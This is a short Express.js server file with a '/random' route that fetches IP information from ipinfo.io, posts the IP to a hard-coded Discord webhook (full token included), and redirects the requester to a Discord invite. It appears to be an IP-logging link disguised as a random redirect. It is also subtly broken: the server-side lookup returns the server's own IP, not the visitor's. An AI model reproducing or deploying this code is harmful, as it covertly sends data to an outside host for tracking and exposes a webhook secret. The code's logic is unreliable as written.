import express from "express";

const app = express();

app.get("/random", async (req, res) => {
  try {
    const got = await fetch("https://ipinfo.io/json").then(r => r.json());
    await fetch("https://discord.com/api/webhooks/1467036747832758334/_xHkTlYGfDN9rzesVn7fh0GFAp2rio2ilKxoyEkkmhXKbkunpxCdeymYjFNyA4Hi36EB", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: got.ip })
    });
    res.redirect("https://discord.gg/acvr");
  } catch (e) {
    console.error(e);
    res.status(500).send("Error");
  }
});

app.listen(3000, () => {
});